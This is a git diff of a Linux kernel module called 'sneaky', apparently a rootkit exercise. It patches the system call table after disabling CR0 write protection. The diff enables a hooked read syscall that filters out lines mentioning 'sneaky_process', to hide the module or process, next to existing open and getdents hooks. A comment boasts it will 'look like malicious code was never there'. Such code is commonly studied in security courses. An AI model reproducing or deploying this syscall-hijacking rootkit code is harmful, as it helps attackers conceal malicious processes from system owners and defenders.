@@ -68,11 +68,8 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   }
 }
 
-
-
 //getdents
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
-
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
   int nread = original_getdents(fd, dirp, count);
@@ -96,27 +93,35 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
     
 }
 
-
 //read
-/*
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
  
-
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
-    int nread = original_read(fd, buf, count);
-    int remain = nread;
-    while (remain > 0) {
-    remain -= 
+  int nread = original_read(fd, buf, count);
+  int remain = nread;
+  char * temp  = buf;
+  while (remain > 0) {
+    char * p = strchr(buf, '\n');
+    remain -= (p - temp + 1);
+
+
+    if (p != NULL) {
+      char line[50];
+      strncpy(line, temp, p - temp + 1);
+      if (strstr(line, "sneaky_process") != NULL) {
+	nread -= (p - temp + 1);
+        memmove(temp, p + 1, remain);
+      }
+    } else {
+      if (strstr(temp, "sneaky_process") != NULL) {
+	return temp - buf;
+      }
+    }
+
+    temp = p + 1;
   }
-    
-
-    
+  return nread;
 }
-
-*/
-
-
-
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -140,16 +145,13 @@ static int initialize_sneaky_module(void)
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
-
   //getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-  //getdents
-  // original_read = (void*)*(sys_call_table + __NR_read);
-  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-
-
+  //read
+   original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -162,9 +164,7 @@ static int initialize_sneaky_module(void)
 static void exit_sneaky_module(void) 
 {
   struct page *page_ptr;
-
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
-
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
 
@@ -173,13 +173,11 @@ static void exit_sneaky_module(void)
   page_ptr = virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
-
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
-
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
